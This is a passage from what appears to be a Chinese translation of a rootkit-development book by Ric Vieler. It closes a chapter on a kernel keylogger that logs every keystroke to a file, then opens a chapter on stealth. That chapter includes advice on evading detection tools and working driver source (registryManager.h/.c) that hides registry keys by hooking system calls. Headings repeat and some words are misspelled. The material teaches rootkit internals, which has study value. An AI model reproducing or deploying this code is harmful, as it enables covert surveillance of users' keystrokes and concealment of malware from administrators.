KeyLoggerThread
KeyLoggerThread
KeyLoggerThread
KeyLoggerThread
这个是进行 I/O 操作的 passive-level 线程函数．
StartKeylogger
StartKeylogger
StartKeylogger
StartKeylogger
在 rootkit 被 加 载 的 时 候 DriverEntry 会 调 用 insertKeyboadFilter 函 数 ， 然 后
insertKeyboadrFilter 会调用 StartKeylogget 这个函数．这个函数对按键记录所需要的东西进
行初始化．
StopKeylogger
StopKeylogger
StopKeylogger
StopKeylogger
这个函数在 rootkit 被卸载的时候由 OnUnload 函数调用．为了防止系统崩溃，注册了的
完成例程在 rootkit 被卸载之前必须完成或者被取消了．
OnCancel
OnCancel
OnCancel
OnCancel
这个函数用来从键盘设备栈里移除一个正在等待的(pending) IRP．
Testing
Testing
Testing
Testing the
the
the
the Example
Example
Example
Example
你可以编译光盘中本章中的代码来测试这个新的键盘记录器．如果一切正常的话，文件
c:\keys.txt 会包含所有在输入"net start MyDeviceDriver"后到输入''net stop MuDeviceDriver'
这段时间内输入的所有可打印字符．文件里会包含在所有程序里按下的按键．一个键盘记录
器的例子如图8-4所示.
8-4
总结
我们现在拥有了一个具有如下功能的 rootkit：
隐藏设备驱动条目
隐藏配置文件
挂钩操作系统内核
挂钩系统加载进程中指定的进程
响应从用户层程序发来的命令
和远程控制者进程通信
对网络通信进行过滤
对文件系统进行过滤
按键记录
在本章中描述的线程和记录的概念同样适用于前面的章节．利用本章讲的技术来记录系
统的配置，当前用户，文件，网络过滤数据和取证数据都可以的．
我们这个 rootkit 仅仅是作为练习用的一个例子．然而这并不能算是一个真正的 rootkit，除
非它还拥有一些隐藏的功能．虽然下一章所讲述的许多隐藏技术都很容易被检测出来，但是
它们已经被广泛地应用在现在的 rootkit 里了．
笫九章 隐藏
概述
隐藏技术的高低是判断一个 rootkit 成功与否的重要因素。混淆隐藏、底层通信链接隐
藏、设备过滤器隐藏、进程注入隐藏、设备驱动条目隐藏等等。到目前为止我能对抗一些简
单的反隐藏的工具对特定的行为的检测，例如文件，注册表项和进程隐藏，但是因为在对
rootkit 进行检测时所在的环境是不确定的，所以我们主要是关注的是隐藏的方法．在这些环
境中，任何一种隐藏方法都可以用来阻止一些有意或无意的篡改．
打个比方说,一个 rootkit 正在监视 USB 的通信，以防止用户把客户的数据拷贝到他们的
存储器中．那么，只要有符合 rootkit 所监视的这个行为出现，就会暴露出 rootkit 的存在．
因为无论是文件一直传送失败还是用一个对话框显示“你不能复制此文件到USB存储器里!”
都会暴露有监控软件的存在．这一类的 rootkit 依靠系统管理员来维持它们的操作，只需要
阻止用户删除软件就行了．在这种情况下应该知道使用挂钩系统调用表的方法来隐藏目录，
注册表项和进程是可行的．
本章包含下面内容:
注册表项的隐藏
文件目录的隐藏
进程的隐藏
测试隐藏效果
注册表项的隐藏
在笫３章中实现的内核钩子是一个挂钩系统调用表的很好例子．但是大多数 rootkit 不
止包含有一个内核钩子．为了给出一个更完整的例子，剩下的三部分会给 rootkit 加上一些
内核钩子来隐藏注册表项,目录和进程．结合这些钩子应该能给 rootkit 设计者对系统的完全
控制提供更深入的了解．
记住,现在越来越多的rootkit检测工具能够很容易地检测到系统调用表钩
子，因此使用系统调用表钩子需要一些测试环境：系统管理员和最终用户或者懂
得rootkit，或者完全不懂得rootkit的检测和清除方法．还有一种选择就是使用
笫4章中讲述的跳转钩子的方法来代替系统调用表钩子．能够检测到跳转钩子的
工具要比能够检测到系统调用表钩子的工具少得多．另外，实现一个使用内核级
跳转钩子的rootkit要困难得多．
如果你看完了下面这个例子，你可能会发现注册表值的隐藏和文件的隐藏并
没有包含进来．这是设计rootkt时的一个原则，这个原则可以用在所有的rootkit
设计上：除了是必须的，否则不要加入任何其它的东西。因为注册表值可以放在
注册表项里面，文件可以放在目录里面，不用额外的钩子就可以实现注册表值和
文件的隐藏功能．在注册表值隐藏方面，重新索引这个注册表值需要2倍以上的
额外开销．要知道，当挂钩内核函数时，处理时间是非常宝贵的．就文件隐藏来
说，一个简单的，隐蔽的，ZwQueryDirectoryFile，可以用来隐藏目录,使被检测到的可
能性减到最小．当设计一个rootkit时，自身被检测到的可能性是必须要虑的一个方面。
隐藏注册表项的功能通过创建两个新文件、修改４个现有的文件来实现．
新文件如下:
registryManager.c
registryManager.h
下面是４个修改的文件:
Ghost.c
hookManager.c
hookManager.h
SOURCES
下面是代码
registryManager.h
registryManager.h
registryManager.h
registryManager.h
文 件 registryManager.h 定 义 了 三 个 数 据 结 构 和 12 个 函 数 来 实 现 注 册 表 项 的 隐 藏 ．
KEY_HANDLE 是一个链表．每一个包含有KEY_ENTRY项的映射项(mapped key)都包含有
一个REG_KEY_DATA 项以及为给定项的每一个子项准备一个SUBKEY_DATA项．这些存
有项索引的子项会被传回到操作系统．项的隐藏是通过调整它的索引来跳过选定项来实现
的．
// Copyright Ric Vieler, 2006
// Support header for registryManager.c
#ifndef _REGISTRY_MANAGER_H_
#define _REGISTRY_MANAGER_H_
// key data structures
typedef struct _KEY_HANDLE
{
HANDLE
handle;
PVOID
keyData;
struct _KEY_HANDLE* previous;
struct _KEY_HANDLE* next;
} KEY_HANDLE;
typedef struct _SUBKEY_DATA
{
ULONG
subkeyIndex;
ULONG
newIndex;
struct _SUBKEY_DATA* next;
} SUBKEY_DATA;
typedef struct _REG_KEY_DATA
{
ULONG subkeys;
SUBKEY_DATA* subkeyData;
} REG_KEY_DATA;
// implementation functions
void InitializeKeyTracking();
void FreeKeyTrackingData();
KEY_HANDLE* FindKeyHandle( HANDLE hKey );
void AddNewKeyHandle( KEY_HANDLE* theNewTrack );
ULONG GetSubkeyCount( HANDLE hKey );
void FreeKeyHandle( HANDLE hKey );
KEY_HANDLE* AllocateKeyHandle( HANDLE hKey );
void AddIndices( KEY_HANDLE* pKeyHandle, ULONG index, ULONG newIndex );
SUBKEY_DATA* AdjustNextNewIndex( SUBKEY_DATA* pSubkeyData, int offset );
void AdjustIndices( KEY_HANDLE* pKeyHandle, int hiddenKeys );
ULONG GetNewIndex( HANDLE hKey, ULONG realIndex);
int CreateHiddenKeyIndices( HANDLE hKey );
#endif
registryManager.c
registryManager.c
registryManager.c
registryManager.c
文件registryManager.c包含了12个用来实现注册表项隐藏的函数.这些函数如下：
InitializeKeyTracking - 在启动时用来初始化项链表．
FreeKeyTrackingData - 在关闭时用来释放项链表的内存
FindKeyHandle - 从一个项的句柄查找项的链表项
AddNewKeyHandle - 添加一个新的项
GetSubkeyCount - 报告一个项的子项，跳过隐藏的项
FreeKeyHandle - 删除一个链表项
AllocateKeyHandle - 为链表项分配内存空间
AddIndices - 为项链表添加子项索引数据
AdjustNextNewIndex - 为多重子项修正一个子项索引
AdjustIndices - 当检测到有多重项时用来调整子项索引
GetNewIndex - 报告一个子项索引，跳过隐藏的项
reateHiddenKeyIndices - 创建一个项链表项
// keyManager
// Copyright Ric Vieler, 2006
// Routines used by registry key hooks
#include "ntddk.h"
#include "Ghost.h"
#include "registryManager.h"
// keys to hide
#define SERVICE_KEY1_LENGTH
14
#define SERVICE_KEY2_LENGTH
10
#define SERVICE_KEY3_LENGTH
10
WCHAR g_key1[] = L"MyDeviceDriver";
WCHAR g_key2[] = L"SSSDriver1";
WCHAR g_key3[] = L"SSSDriver2";
// master key list
KEY_HANDLE g_keyList;
// synchronization objects
KSPIN_LOCK g_registrySpinLock;
KIRQL g_pCurrentIRQL;
// Call this once from DriverEntry()
void InitializeKeyTracking()
{
memset(&g_keyList, 0, sizeof(KEY_HANDLE));
}
// Call this once from OnUnload()
void FreeKeyTrackingData()
{
REG_KEY_DATA* pKeyData;
SUBKEY_DATA* pSubkeyData;
SUBKEY_DATA* pNextSubkey;
KEY_HANDLE* pNextKeyHandle;
KEY_HANDLE* pKeyHandle = g_keyList.next;
while( pKeyHandle )
{
pKeyData = ((REG_KEY_DATA*)( pKeyHandle->keyData ));
if( pKeyData )
{
pSubkeyData = pKeyData->subkeyData;
while( pSubkeyData )
{
pNextSubkey = pSubkeyData->next;
ExFreePool( pSubkeyData );
pSubkeyData = pNextSubkey;
}
ExFreePool( pKeyData );
}
pNextKeyHandle = pKeyHandle->next;
ExFreePool( pKeyHandle );
pKeyHandle = pNextKeyHandle;
}
}
// Look for a specific key
KEY_HANDLE* FindKeyHandle( HANDLE hKey )
{
KEY_HANDLE* pKeyHandle = &g_keyList;
KeAcquireSpinLock( &g_registrySpinLock, &g_pCurrentIRQL );
while( pKeyHandle->next != NULL )
{
pKeyHandle = pKeyHandle->next;
if(pKeyHandle->handle == hKey)
{
KeReleaseSpinLock( &g_registrySpinLock, g_pCurrentIRQL );
return pKeyHandle;
}
}
KeReleaseSpinLock( &g_registrySpinLock, g_pCurrentIRQL );
return NULL;
}
// Add a key to the key list
void AddNewKeyHandle( KEY_HANDLE* newKey )
{
KEY_HANDLE* pKeyHandle = &g_keyList;
KeAcquireSpinLock(&g_registrySpinLock, &g_pCurrentIRQL);
while( pKeyHandle->next != NULL )
pKeyHandle = pKeyHandle->next;
pKeyHandle->next = newKey;
newKey->next = NULL;
newKey->previous = pKeyHandle;
KeReleaseSpinLock(&g_registrySpinLock, g_pCurrentIRQL);
}
// Find the index that skips hidden keys
ULONG GetNewIndex( HANDLE hKey, ULONG index )
{
KEY_HANDLE* pKeyHandle = FindKeyHandle( hKey );
KeAcquireSpinLock( &g_registrySpinLock, &g_pCurrentIRQL );
if( pKeyHandle )
{
if( pKeyHandle->keyData )
{
REG_KEY_DATA* pKeyData = ((REG_KEY_DATA*)( pKeyHandle->keyData ));
if( pKeyData )
{
SUBKEY_DATA* pSubkeyData = pKeyData->subkeyData;
while( pSubkeyData )
{
pSubkeyData = pSubkeyData->next;
if( pSubkeyData )
{
if( index == pSubkeyData->subkeyIndex )
{
ULONG foundIndex = pSubkeyData->newIndex;
KeReleaseSpinLock( &g_registrySpinLock, g_pCurrentIRQL );
return foundIndex;
}
}
}
}
}
}
KeReleaseSpinLock( &g_registrySpinLock, g_pCurrentIRQL );
return -1;
}
// Find the key count that skips hidden keys
ULONG GetSubkeyCount( HANDLE hKey )
{
KEY_HANDLE* pKeyHandle = FindKeyHandle( hKey );
KeAcquireSpinLock( &g_registrySpinLock, &g_pCurrentIRQL );
if( pKeyHandle )
{
REG_KEY_DATA* pKeyData = ((REG_KEY_DATA*)( pKeyHandle->keyData ));
if( pKeyData )
{
ULONG subKeys = pKeyData->subkeys;
KeReleaseSpinLock(&g_registrySpinLock, g_pCurrentIRQL);
return( subKeys );
}
}
KeReleaseSpinLock(&g_registrySpinLock, g_pCurrentIRQL);
return -1;
}
void FreeKeyHandle( HANDLE hKey )
{
REG_KEY_DATA* pKeyData;
SUBKEY_DATA* pSubkeyData;
SUBKEY_DATA* pNextSubkey;
KEY_HANDLE* pKeyHandle = FindKeyHandle( hKey );
KeAcquireSpinLock( &g_registrySpinLock, &g_pCurrentIRQL );
if( pKeyHandle )
{
KEY_HANDLE* pPreviousKey = pKeyHandle->previous;
KEY_HANDLE* pNextKey = pKeyHandle->next;
pPreviousKey->next = pNextKey;
if( pNextKey )
pNextKey->previous = pPreviousKey;
}
KeReleaseSpinLock( &g_registrySpinLock, g_pCurrentIRQL );
if( pKeyHandle )
{
pKeyData = NULL;
pKeyData = ((REG_KEY_DATA*)( pKeyHandle->keyData ));
if( pKeyData )
{
pSubkeyData = pKeyData->subkeyData;
while( pSubkeyData )
{
pNextSubkey = pSubkeyData->next;
ExFreePool( pSubkeyData );
pSubkeyData = pNextSubkey;
}
ExFreePool( pKeyData );
}
ExFreePool( pKeyHandle );
}
}
KEY_HANDLE* AllocateKeyHandle( HANDLE hKey )
{
KEY_HANDLE* pKeyHandle = NULL;
pKeyHandle = (KEY_HANDLE*)ExAllocatePool( PagedPool,
sizeof(KEY_HANDLE) );
if( pKeyHandle )
{
memset( pKeyHandle, 0, sizeof(KEY_HANDLE) );